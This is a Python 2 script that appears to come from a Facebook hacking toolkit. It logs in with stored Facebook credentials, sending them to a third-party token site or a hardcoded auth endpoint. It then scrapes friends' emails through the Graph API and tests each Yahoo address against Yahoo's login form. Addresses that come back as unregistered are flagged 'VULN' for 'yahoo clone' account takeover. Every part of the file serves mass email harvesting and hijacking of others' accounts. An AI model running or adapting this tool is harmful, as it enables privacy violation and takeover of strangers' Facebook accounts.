import re
import os
import sys
import json
import bs4,mechanize
import requests
from data import cache
from data.color import *
import interpreter
from data import token
from multiprocessing.pool import ThreadPool
cache.cleanCache()

def ins():
	raw_input("\n[+] finished\npress enter to menu...")
	os.system("clear")
	interpreter.ASU()

def ngontol(what):
	if os.path.exists("out"):
		if os.path.exists("out/"+what+".txt"):
			if os.path.getsize("out/"+what+".txt") !=0:
				cek=raw_input('%s[!]%s file exists: out/%s%s.txt%s\n%s[?]%s replace? y/n): '%(R,N,B,what,N,R,N)).lower()
				if cek == "y":
					open("out/"+what+".txt","w").close()
			else:open("out/"+what+".txt","w").close()
	else:
		os.mkdir("out")
		open("out/"+what+".txt","w").close()
		
class yahoo_clone:
	def __init__(self):
		self.token=""
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.i="https://graph.facebook.com/{}"
		ngontol("yahoo_vuln")
		self.toke()
	
	def maklo(self,arg,kwds):
		m=mechanize.Browser()
		m.set_handle_equiv(True)
		m.set_handle_redirect(True)
		m.set_handle_robots(False)
		m.addheaders=[
			("User-Agent","Mozilla 5.1 (Linux Android)")]
		m.open("https://login.yahoo.com/config/login")
		m._factory.is_html=True
		m.select_form(nr=0)
		m.form["username"]="%s"%(arg)
		r=m.submit().read()
		F=re.findall(
			"messages\.ERROR_INVALID_USERNAME",r)
		if len(F) !=0:
			print "[ %sVULN%s ] %s => %s"%(G,N,kwds,arg)
			open("out/yahoo_vuln.txt","a").write("%s -> %s\n"%(kwds,arg))
			m.close()
		else:
			print "[ %sDIEE%s ] %s => %s"%(R,N,kwds,arg)
			m.close()
		
	def toke(self):
		try:
			self.token=requests.get(
			bs4.BeautifulSoup(requests.post(
				"https://m.autolikeus.me/token.get.php",
			data={"username":self.config["email"],
				"password":self.config["pass"]}).text,
			features="html.parser").find(
				"iframe")["src"]).json()["access_token"]
		except:
			exit("%s[!]%s login failed."%(R,N))
		self.dump()
	
	def dump(self):
		id=[]
		for i in requests.get(self.i.format(
			"me/friends?access_token=%s"%(
				self.token))).json()["data"]:
			
			id.append(i["id"])
		print("%s[+]%s friend: %s"%(G,N,len(id)))
		print("%s[*]%s output: out/yahoo_vuln.txt"%(G,N))
		p=ThreadPool(input("%s[?]%s enter threads: "%(G,N)))
		p.map(self.yahoocek,id)

	def yahoocek(self,id):
		f=requests.get(
			self.i.format(
				id+"?access_token=%s"%(
					self.token))).json()
		try:
			if "yahoo.com" in f["email"]:
				self.maklo(f["email"],f["name"])

		except Exception as f:
			pass
			
class yahoo_narget:
	def __init__(self):
		self.token=""
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.i="https://graph.facebook.com/{}"
		self.toke()
	
	def maklo(self,arg,kwds):
		m=mechanize.Browser()
		m.set_handle_equiv(True)
		m.set_handle_redirect(True)
		m.set_handle_robots(False)
		m.addheaders=[
			("User-Agent","Mozilla 5.1 (Linux Android)")]
		m.open("https://login.yahoo.com/config/login")
		m._factory.is_html=True
		m.select_form(nr=0)
		m.form["username"]="%s"%(arg)
		r=m.submit().read()
		F=re.findall(
			"messages\.ERROR_INVALID_USERNAME",r)
		if len(F) !=0:
			print "[ %sVULNERABLE YAHOO CLONE%s ] %s"%(G,N,arg)
			open("out/yahoo_vuln.txt","a").write("%s -> %s\n"%(kwds,arg))
			m.close()
		else:
			print "[ %sNOT VULNERABLE%s ] %s => %s"%(R,N,kwds,arg)
			m.close()
		
	def toke(self):
		try:
			self.token=requests.get(
			bs4.BeautifulSoup(requests.post(
				"https://m.autolikeus.me/token.get.php",
			data={"username":self.config["email"],
				"password":self.config["pass"]}).text,
			features="html.parser").find(
				"iframe")["src"]).json()["access_token"]
		except:
			exit("%s[!]%s login failed."%(R,N))
		self.kntl()
			
			
	def kntl(self):
		self.q=raw_input("%s[?]%s query: "%(G,N)).lower()
		if self.q =="":
			return self.kntl()
		self.dump()
	
	def dump(self):
		id=[]
		print 
		for i in requests.get(self.i.format(
			"me/friends?access_token=%s"%(
				self.token))).json()["data"]:
			
			if self.q in i["name"].lower():
				id.append(i["id"])
				print("%s. %s"%(
					len(id),i["name"].lower().replace(self.q,
						"%s%s%s"%(R,self.q,N))))
		if len(id) !=0:
			self.num(id)
		else:
			print("%s[!]%s no result for: %s"%(R,N,self.q))
			return self.kntl()
		
	def num(self,id):
		try:
			self.p=input("\n%s[?]%s select number: "%(G,N))
		except Exception as f:
			print("%s[!]%s %s"%(R,N,f))
			return self.num(id)
		self.yahoocek(id[self.p-1])

	def yahoocek(self,id):
		self.f=requests.get(
			self.i.format(
				id+"?access_token=%s"%(
					self.token))).json()
		try:
			if "yahoo.com" in self.f["email"]:
				print("[*] name : %s"%(self.f["name"]))
				print("[*] email: %s"%(self.f["email"]))
				print("[*] checking ...")
				self.maklo(self.f["email"],self.f["name"])
				pg=raw_input("[?] retry? y/n): ")
				if pg == "y":
					return self.kntl()
			else:
				print("[*] name : %s"%(self.f["name"]))
				print("[*] email: %s"%(self.f["email"]))
				print("[*] unknown email.")
				pg=raw_input("[?] retry? y/n): ")
				if pg == "y":
					return self.kntl()
		except:
			print("[*] name : %s"%(self.f["name"]))
			print("[*] unknown email.")
			pg=raw_input("[?] retry? y/n): ")
			if pg == "y":
				return self.kntl()

class dump_yahoo(object):
	def __init__(self):
		self.fl=[]
		self.found=[]
		self.cout=0
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.token=self.gentok(self.config["email"],
			self.config["pass"])
		print("%s[*]%s yahoo dumpper from: %s friendlists"%(
			G,N,self.config["name"]))
		for i in requests.get("https://graph.facebook.com/me/friends?access_token=%s"%(self.token)).json()["data"]:
			self.fl.append(i["id"])
		self.thread()
		
	def thread(self):
		try:
			self.l=ThreadPool(input("%s[?]%s Thread: "%(G,N)))
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.thread()
		self.res()
	
	def res(self):
		try:
			self.aa=raw_input("%s[?]%s result file name: "%(G,N))
			if self.aa =="":
				self.res()
			open("out/%s"%(self.aa),"w")
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.res()
		print "%s[*]%s output saved: out/%s"%(G,N,self.aa)
		self.l.map(self.crack,self.fl)
		print "\n[+] finished with output: out/%s"%(self.aa)
		ins()
		
	def gentok(self,email,pas):
		try:
			return requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(email,pas)).json()["access_token"]
		except:
			exit("%s[!]%s failed generate token."%(R,N))
			
	def crack(self,email):
		self.cout+=1
		print "\r%s[*]%s Dumping Mailist %s/%s Written Success:-%s"%(G,N,self.cout,len(self.fl),len(self.found)),;sys.stdout.flush()
		try:
			s=requests.get("https://graph.facebook.com/%s?access_token=%s"%(email,self.token)).json()
			if "yahoo.com" in s["email"]:
				self.found.append(s["email"])
				open("out/%s"%(self.aa),"a").write("%s\n"%(s["email"]))
				
		except:pass
		
class yah(object):
	def __init__(self):
		self.mail()
		
	def mail(self):
		try:
			self.a=open(raw_input("%s[?]%s mailist: "%(G,N))).read().splitlines()
		except Exception as e:
			print "%s[!]%s %s"%(G,N,e)
			self.mail()
		print "%s[*]%s mailist count: %s"%(G,N,len(self.a))
		self.thread()
	
	def thread(self):
		try:
			i=input("%s[?]%s Thread: "%(G,N))
			if i > 10:
				print "%s[!]%s max thread 10"%(R,N)
				self.thread()
			self.t=ThreadPool(i)
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.thread()
		self.f()
	
	def f(self):
		try:
			self.s=raw_input("%s[?]%s result filename: "%(G,N))
			open("out/%s"%(self.s),"w")
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.f()
		print "%s[*]%s output: out/%s"%(G,N,self.s)
		self.t.map(self.maklo,self.a)
		print "\n[+] finished."
		ins()
		
	def maklo(self,arg):
		m=mechanize.Browser()
		m.set_handle_equiv(True)
		m.set_handle_redirect(True)
		m.set_handle_robots(False)
		m.addheaders=[
			("User-Agent","Mozilla 5.1 (Linux Android)")]
		m.open("https://login.yahoo.com/config/login")
		m._factory.is_html=True
		m.select_form(nr=0)
		m.form["username"]="%s"%(arg)
		r=m.submit().read()
		F=re.findall(
			"messages\.ERROR_INVALID_USERNAME",r)
		if len(F) !=0:
			print "[ %sVULN%s ]: %s"%(G,N,arg)
			open("out/%s"%(self.s),"a").write("%s\n"%(arg))
			m.close()
		else:
			print "[ %sDIEE%s ]: %s"%(R,N,arg)
			m.close()

		
class logs(object):
	def __init__(self):
		self.token=""
		self.count=0
		self.fo=[]
		config=open("config/config.json").read()
		self.config=json.loads(config)
		z=token.token("%s|%s"%(self.config["email"],self.config["pass"]))
		if z !=False:
			if os.path.exists("out"):
				self.token=z
				self.id()
			else:
				os.mkdir("out")
				self.id()
		else:exit("%s[!]%s login failed."%(R,N))
		
	def id(self):
		try:
			self.a=open(raw_input("%s[?]%s List ID: "%(G,N))).read().splitlines()
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.id()
		self.t()
		
	def t(self):
		try:
			self.th=ThreadPool(input("%s[?]%s Thread: "%(G,N)))
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.t()
		self.fileno()
	
	def fileno(self):
		try:
			self.s=raw_input("%s[?]%s result filename: "%(G,N))
			if self.s =="":
				self.fileno()
			else:open("out/%s"%(self.s),"w").close()
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.fileno()
		print "%s[!]%s checking email from %s id"%(G,N,len(self.a))
		print "%s[*]%s Output: out/%s"%(G,N,self.s)
		print 
		self.th.map(self.cek,self.a)
		ins()
		
	
	def cek(self,email):
		self.count+=1
		try:
			s=requests.get("https://graph.facebook.com/%s?access_token=%s"%(email,self.token)).json()
			z=s["email"]
			if "yahoo.com" in z:
				self.fo.append(z)
				open("out/%s"%(self.s),"a").write("%s\n"%(z))
				print "[+] %s -> https://mbasic.facebook.com/%s                     "%(z,s["id"])
		except Exception as e:
			pass
		#print "\r[+] Checking %s/%s - Found-: %s%s%s"%(self.count,len(self.a),G,len(self.fo),N),;sys.stdout.flush()
		
		
		
def clone():
	r = raw_input('\n%s[%s+%s]%s Actions>> ' % (G, R, G, N))
	if r =="1" or r =="01":
		yahoo_clone()
	elif r =="2" or r =="02":
		yahoo_narget()
	elif r =="3" or r =="03":
		yah()
	elif r =="4" or r =="04":
		dump_yahoo()
	elif r =="5" or r =="05":
		logs()
	elif r =="6" or r =="06":
		ins()
	else:
		print("%s[!]%s invalid options"%(R,N))
		clone()

def clon():
	print("\t[ Select Actions ]\n")
	print("  {%s01%s} Mass Check"%(G,N))
	print("  {%s02%s} Narget"%(G,N))
	print("  {%s03%s} Single yahoo checker from mailist"%(G,N))
	print("  {%s04%s} Dumps Yahoo Mail Only From Friendlists."%(G,N))
	print("  {%s05%s} Dumps Yahoo Mail Only From ID LIST"%(G,N))
	print("  {%s06%s} Back To Menu Options"%(R,N))
	
	clone()
	

